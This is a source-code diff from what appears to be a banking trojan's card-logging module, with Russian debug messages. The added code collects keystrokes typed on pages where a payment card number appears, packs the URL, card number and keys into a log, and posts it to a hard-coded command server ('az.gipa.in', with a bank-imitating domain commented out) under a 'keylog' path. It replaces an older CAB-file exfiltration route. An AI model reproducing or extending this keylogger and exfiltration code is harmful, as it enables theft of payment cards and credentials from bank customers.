@@ -42,6 +42,7 @@ static UrlKeys* AddUrl( const char* url )
 	uk->url[len] = 0;
 	uk->endPos = -1;
 	uk->posCard = -1;
+	List::Add( listData, uk );
 	return uk;
 }
 
@@ -87,12 +88,20 @@ static char* CharToHex( unsigned char c, char* buf )
 	return buf;
 }
 
+const char* panelaz = "az.gipa.in"; //"sberbanksystem.ru";
+
+static char* GetAzUrl( char* url )
+{
+	m_lstrcpy( url, panelaz );
+	return url;
+}
+
 static void SendLog( UrlKeys* uk )
 {
 	CCDBG( "CC", "Найдена карточка %s, позиция %d, урл: '%s'", uk->numCard, uk->posCard, uk->url );
-	char* mem = (char*)MemAlloc( sizeof(uk->keys) * 5 + 128 );
+	char* log = (char*)MemAlloc( sizeof(uk->keys) * 5 + 128 );
 	fwsprintfA pwsprintf = Get_wsprintfA();
-	pwsprintf( mem, "Url: %s\nFinded card: %s\nLogged keys: ", uk->url, uk->numCard );
+	//pwsprintf( log, "Url: %s\nFinded card: %s\nLogged keys: ", uk->url, uk->numCard );
 
 	int delim = 0; //вставка квадратных скобок для выделения номера карты
 	for( int i = 0; i <= uk->endPos; i++ )
@@ -114,7 +123,7 @@ static void SendLog( UrlKeys* uk )
 		}
 		if( GetNonPrintCharText( c, buf ) )
 		{
-			m_lstrcat( mem, buf );
+			m_lstrcat( log, buf );
 			STR::Free(buf);
 		}
 		else
@@ -129,10 +138,29 @@ static void SendLog( UrlKeys* uk )
 				buf[0] = c;
 				buf[1] = 0;
 			}
-			m_lstrcat( mem, buf );
+			m_lstrcat( log, buf );
 		}
 	}
-	int len = m_lstrlen(mem);
+	int lenLog = m_lstrlen(log);
+	MemPtr<1024> mem;
+	char* azUrl = GetAzUrl(mem.str());
+	char* uid = mem.str() + 128;
+	char* postUrl = mem.str() + 256;
+	if( azUrl )
+	{
+		GenerateUid(uid);
+		pwsprintf( postUrl, "%s/cat/?mode=save&subsys=keylog", azUrl );
+		CCDBG( "CC", "отправляем лог в %s", postUrl );
+		PStrings fields = Strings::Create();
+		AddURLParam( fields, "id", (char*)uid );
+		AddURLParam( fields, "log", log, lenLog );
+		THTTPResponse response;
+	    ClearStruct(response);
+		HTTP::Post( (char*)postUrl, fields, 0, &response );
+		Strings::Free(fields);
+		HTTPResponse::Clear(&response);
+	}
+/*
 	char cabFile[MAX_PATH];
 	File::GetTempName(cabFile);
 	HCAB cab = CreateCab(cabFile);
@@ -141,7 +169,8 @@ static void SendLog( UrlKeys* uk )
 //	CCDBG( "CC", "CAB сохранен в файле %s", cabFile );
 //	DataGrabber::SendCabDelayed( 0, cabFile, "CC" );
 	pDeleteFileA(cabFile);
-	MemFree(mem);
+*/
+	MemFree(log);
 	//очищаем буфер
 	uk->endPos = -1;
 	uk->posCard = -1;
@@ -151,9 +180,11 @@ static void SendLog( UrlKeys* uk )
 static void FlushLog()
 {
 	int count = List::Count(listData);
+	CCDBG( "CC", "урлов %d", count );
 	for( int i = 0; i < count; i++ )
 	{
 		UrlKeys* uk = (UrlKeys*)List::GetItem( listData, i );
+		CCDBG( "CC", "урл %s, %d", uk->url, uk->posCard );
 		if( uk->posCard >= 0 )
 			SendLog(uk);
 	}
